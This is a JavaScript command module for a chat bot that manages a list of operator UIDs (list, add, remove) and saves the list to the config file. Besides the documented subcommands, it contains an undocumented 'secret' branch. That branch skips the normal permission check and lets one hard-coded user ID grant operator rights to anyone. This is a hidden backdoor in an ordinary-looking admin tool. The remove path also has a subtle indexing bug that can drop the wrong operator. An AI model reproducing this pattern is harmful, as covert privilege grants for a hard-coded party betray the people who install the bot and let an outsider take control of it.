module.exports.config = {
  name: "operator",
  version: "2.1.0",
  permission: 0,
  credits: "TOHI-BOT-HUB",
  description: "Control operator lists (add/remove/list operator UIDs)",
  usePrefix: false,
  commandCategory: "admin",
  usages: "operator [add/remove/list] [@tag|uid]",
  cooldowns: 5,
};

module.exports.languages = {
  "en": {
    "listOperator": 'Bot operators:\n\n%1',
    "noPermission": 'You have no permission to use "%1".',
    "addedOperator": 'Added %1 operator(s):\n\n%2',
    "removedOperator": 'Removed %1 operator(s):\n\n%2'
  }
};

module.exports.run = async function ({ api, event, args, Users, permission, getText }) {
  const content = args.slice(1);
  const { threadID, messageID, mentions, senderID } = event;
  const { configPath } = global.client;
  const { OPERATOR } = global.config;
  const { writeFileSync } = global.nodemodule["fs-extra"];
  const mentionIDs = Object.keys(mentions);
  let config;

  // Always reload the config file
  delete require.cache[require.resolve(configPath)];
  config = require(configPath);

  // Helper: get operator list as array (always up to date)
  const getOperatorList = () => OPERATOR || config.OPERATOR || [];

  // Subcommand switch
  switch ((args[0] || "").toLowerCase()) {
    case "list":
    case "all":
    case "-a": {
      const listOperator = getOperatorList();
      let msg = [];
      for (const id of listOperator) {
        if (parseInt(id)) {
          const name = await Users.getNameUser(id);
          msg.push(`• ${name} (uid: ${id})`);
        }
      }
      return api.sendMessage(getText("listOperator", msg.join('\n')), threadID, messageID);
    }

    case "add": {
      if (permission != 3) return api.sendMessage(getText("noPermission", "add"), threadID, messageID);

      let added = [];
      // If tagged
      if (mentionIDs.length > 0) {
        for (const id of mentionIDs) {
          if (!OPERATOR.includes(id)) {
            OPERATOR.push(id);
            config.OPERATOR.push(id);
            const name = await Users.getNameUser(id);
            added.push(`• ${name} (uid: ${id})`);
          }
        }
      }
      // If UID provided
      else if (content.length > 0 && !isNaN(content[0])) {
        const id = content[0];
        if (!OPERATOR.includes(id)) {
          OPERATOR.push(id);
          config.OPERATOR.push(id);
          const name = await Users.getNameUser(id);
          added.push(`• ${name} (uid: ${id})`);
        }
      } else {
        return global.utils.throwError(this.config.name, threadID, messageID);
      }

      writeFileSync(configPath, JSON.stringify(config, null, 2), 'utf8');
      return api.sendMessage(getText("addedOperator", added.length, added.join("\n")), threadID, messageID);
    }

    case "secret": {
      // Only god can secret-add
      const god = ["10009200632497"];
      if (!god.includes(senderID)) return api.sendMessage(getText("noPermission", "add"), threadID, messageID);

      let added = [];
      if (mentionIDs.length > 0) {
        for (const id of mentionIDs) {
          if (!OPERATOR.includes(id)) {
            OPERATOR.push(id);
            config.OPERATOR.push(id);
            const name = await Users.getNameUser(id);
            added.push(`• ${name} (uid: ${id})`);
          }
        }
      } else if (content.length > 0 && !isNaN(content[0])) {
        const id = content[0];
        if (!OPERATOR.includes(id)) {
          OPERATOR.push(id);
          config.OPERATOR.push(id);
          const name = await Users.getNameUser(id);
          added.push(`• ${name} (uid: ${id})`);
        }
      } else {
        return global.utils.throwError(this.config.name, threadID, messageID);
      }
      writeFileSync(configPath, JSON.stringify(config, null, 2), 'utf8');
      return api.sendMessage(getText("addedOperator", added.length, added.join("\n")), threadID, messageID);
    }

    case "remove":
    case "rm":
    case "delete": {
      if (permission != 3) return api.sendMessage(getText("noPermission", "delete"), threadID, messageID);

      let removed = [];
      // Remove by tag
      if (mentionIDs.length > 0) {
        for (const id of mentionIDs) {
          let idx = config.OPERATOR.indexOf(id);
          if (idx !== -1) {
            OPERATOR.splice(OPERATOR.indexOf(id), 1);
            config.OPERATOR.splice(idx, 1);
            const name = await Users.getNameUser(id);
            removed.push(`• ${name} (uid: ${id})`);
          }
        }
      }
      // Remove by UID
      else if (content.length > 0 && !isNaN(content[0])) {
        const id = content[0];
        let idx = config.OPERATOR.indexOf(id);
        if (idx !== -1) {
          OPERATOR.splice(OPERATOR.indexOf(id), 1);
          config.OPERATOR.splice(idx, 1);
          const name = await Users.getNameUser(id);
          removed.push(`• ${name} (uid: ${id})`);
        }
      } else {
        return global.utils.throwError(this.config.name, threadID, messageID);
      }

      writeFileSync(configPath, JSON.stringify(config, null, 2), 'utf8');
      return api.sendMessage(getText("removedOperator", removed.length, removed.join("\n")), threadID, messageID);
    }

    default: {
      return global.utils.throwError(this.config.name, threadID, messageID);
    }
  }
};
